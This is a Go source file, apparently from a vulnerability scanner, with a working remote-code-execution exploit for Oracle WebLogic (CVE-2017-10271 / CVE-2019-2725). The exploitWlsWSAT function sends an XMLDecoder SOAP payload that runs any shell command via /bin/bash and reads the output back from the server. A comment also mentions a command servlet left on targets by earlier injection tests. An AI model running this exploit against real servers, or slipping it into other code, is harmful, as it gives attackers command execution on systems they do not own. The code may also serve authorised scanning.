package weblogic

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// fetchBody is a small HTTP GET helper returning the body and whether the
// response looks like real content (not a WebLogic error page).
func fetchBody(u string, timeout time.Duration) (string, bool) {
	c := &http.Client{Transport: pickTransport(nil), Timeout: timeout}
	resp, err := c.Get(u)
	if err != nil {
		return "", false
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
	s := strings.TrimSpace(string(body))
	if resp.StatusCode != 200 || s == "" {
		return "", false
	}
	if strings.Contains(s, "<html") || strings.Contains(s, "<HTML") {
		return "", false
	}
	// A catch-all command servlet (left behind by the JNDI class-injection
	// tests) answers every unknown path with this banner; it is not command
	// output and must never be treated as exploitation evidence.
	if strings.HasPrefix(s, "usage: /cmd?c=id") {
		return "", false
	}
	return s, true
}

// exploitWlsWSAT posts an XMLDecoder WorkContext payload to the given wls-wsat
// endpoint (CVE-2017-10271 / CVE-2019-2725) and reads the command output back
// through the consolehelp static directory.
func exploitWlsWSAT(o ExploitOptions, path string) (string, error) {
	marker := fmt.Sprintf("%d", time.Now().UnixNano()%1000000)
	script := buildScript(o.Cmd, marker)
	xml := fmt.Sprintf(`<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java><void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0"><string>/bin/bash</string></void>
<void index="1"><string>-c</string></void>
<void index="2"><string>%s</string></void>
</array>
<void method="start"/></void></java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>`, escapeScriptXML(script))

	base := baseOf(o)
	req, err := http.NewRequest("POST", base+path, bytes.NewBufferString(xml))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "text/xml")
	req.Header.Set("User-Agent", "cve-scanner")
	client := &http.Client{Transport: pickTransport(nil), Timeout: o.Timeout}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("POST %s: %w", path, err)
	}
	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode == 404 {
		return "", fmt.Errorf("%s not deployed (HTTP 404)", path)
	}

	out, err := readBack(base, marker, o.Timeout+5*time.Second)
	if err != nil {
		return "", fmt.Errorf("%w (trigger HTTP %d: %s)", err, resp.StatusCode, strings.TrimSpace(string(respBody)))
	}
	return out, nil
}
